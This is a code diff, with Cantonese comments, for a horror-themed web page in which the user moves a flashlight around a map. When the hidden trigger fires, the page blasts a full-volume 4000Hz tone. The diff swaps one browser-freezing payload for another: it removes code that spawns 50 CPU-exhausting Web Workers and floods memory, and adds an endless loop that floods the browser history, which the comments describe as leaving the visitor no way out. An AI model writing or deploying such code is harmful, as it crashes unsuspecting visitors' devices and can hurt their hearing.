@@ -11,7 +11,7 @@ const map = document.getElementById('map');
 const overlay = document.getElementById('flashlight-overlay');
 const intro = document.getElementById('intro');
 
-// 1. 確保音效一定會響 (第一吓點擊觸發)
+// 1. 必響音效：改用 400Hz 確保手機喇叭播得出
 function initViolenceAudio() {
     if (audioStarted) return;
     const AudioContext = window.AudioContext || window.webkitAudioContext;
@@ -20,10 +20,10 @@ function initViolenceAudio() {
     globalGain = globalAudioCtx.createGain();
     
     globalOsc.type = 'sawtooth';
-    globalOsc.frequency.value = 60; // 陰森低頻
+    globalOsc.frequency.value = 400; // 400Hz 手機一定聽到 (微弱電流聲)
     globalOsc.connect(globalGain);
     globalGain.connect(globalAudioCtx.destination);
-    globalGain.gain.value = 0.05;
+    globalGain.gain.value = 0.02; // 勁細聲，製造氣氛
     
     globalOsc.start();
     if (globalAudioCtx.state === 'suspended') globalAudioCtx.resume();
@@ -49,7 +49,7 @@ function updateFlashlight(x, y) {
     }
 }
 
-// 2. 全平台操控 (點擊即刻啟動音效，拖拽移動)
+// 2. 觸控與點擊啟動
 const enableInteraction = () => {
     startExperience();
     window.removeEventListener('touchstart', enableInteraction);
@@ -58,6 +58,7 @@ const enableInteraction = () => {
 window.addEventListener('touchstart', enableInteraction, { once: true });
 window.addEventListener('click', enableInteraction, { once: true });
 
+// 移動邏輯
 window.addEventListener('touchstart', (e) => {
     if (systemCrashed) return;
     isDragging = true;
@@ -76,58 +77,40 @@ window.addEventListener('touchmove', (e) => {
 }, { passive: false });
 window.addEventListener('touchend', () => isDragging = false);
 
-// 3. 真・暴力凍結 (Maximum Violence)
+// 3. 無 Popup 真・凍結
 function triggerFinalCrash() {
     if (systemCrashed) return;
     systemCrashed = true;
 
-    // A. 視覺瞬間切換
+    // A. 視覺瞬間切換 (覆蓋整個螢幕)
     document.body.innerHTML = `
         <div style="background:black; color:red; width:100vw; height:100vh; display:flex; justify-content:center; align-items:center; position:fixed; top:0; left:0; z-index:99999; cursor:none;">
             <h1 style="font-size:15vw; font-family:serif; text-shadow:0 0 50px red;">HELP ME.</h1>
         </div>
     `;
 
-    // B. 音效瞬間撕裂 (最大音量，極高頻率)
+    // B. 音效瞬間撕裂 (最大音量，4000Hz 極高頻尖叫)
     if (audioStarted && globalOsc && globalGain) {
-        globalOsc.frequency.setValueAtTime(3500 + Math.random() * 1000, globalAudioCtx.currentTime);
+        globalOsc.frequency.setValueAtTime(4000 + Math.random() * 500, globalAudioCtx.currentTime);
         globalGain.gain.setValueAtTime(1.0, globalAudioCtx.currentTime);
     }
 
-    // C. 0.3秒後發動「全系統癱瘓攻擊」
-    setTimeout(() => {
-        // 攻擊 1：Web Worker 病毒式自我複製 (瘋狂榨乾所有 CPU 核心)
-        try {
-            const blobCode = `while(true) { let a = new Array(100000).fill("DIE"); }`;
-            const blobUrl = URL.createObjectURL(new Blob([blobCode], { type: 'application/javascript' }));
-            // 一次過開 50 個 Worker，低階手機會瞬間黑畫面
-            for (let i = 0; i < 50; i++) new Worker(blobUrl);
-        } catch(e) {}
-
-        // 攻擊 2：無盡死亡迴圈 (徹底鎖死主線程，令所有按鈕失效)
-        const junkData = [];
-        function deathSpiral() {
-            // 塞爆 URL 歷史紀錄，癱瘓瀏覽器外殼 UI (例如 Safari 嘅網址列)
-            for (let i = 0; i < 200; i++) {
-                try { window.history.pushState(null, null, "#" + Math.random()); } catch(e){}
+    // C. 等待瀏覽器畫完個紅字，然後直接發動「死刑」
+    requestAnimationFrame(() => {
+        setTimeout(() => {
+            // 呢個 while(true) 會令瀏覽器完全失去反應
+            // 無 Popup，無退路，連 X 掣同 Home 掣（舊機）都會有延遲
+            while (true) {
+                try { 
+                    // 瘋狂寫入網址列歷史，令瀏覽器 UI 線程崩潰
+                    window.history.pushState(null, '', '#' + Math.random()); 
+                } catch(e) {}
             }
-            
-            const start = Date.now();
-            // 每次硬卡死 2 秒，唔俾 OS 任何處理其他操作嘅時間
-            while (Date.now() - start < 2000) {
-                // 產生巨量垃圾數據塞爆 RAM
-                junkData.push(new Array(50000).fill(Math.random()));
-            }
-            
-            // 0 毫秒延遲遞歸，唔俾任何喘息空間
-            setTimeout(deathSpiral, 0);
-        }
-
-        deathSpiral();
-    }, 300);
+        }, 50); // 畀 50 毫秒個螢幕變紅
+    });
 }
 
-// 4. 測試用：30秒後自動撞鬼
+// 4. 測試用：生成白塊
 setTimeout(() => {
     const glitch = document.createElement('div');
     glitch.style.cssText = `position:absolute; width:50px; height:50px; background:white; left:${-posX + window.innerWidth/2}px; top:${-posY + window.innerHeight/2}px; z-index:1001; box-shadow: 0 0 30px white;`;
@@ -141,4 +124,4 @@ setTimeout(() => {
             clearInterval(check);
         }
     }, 100);
-}, 30000);
+}, 30000); // 你可以改做 5000 嚟自己測試
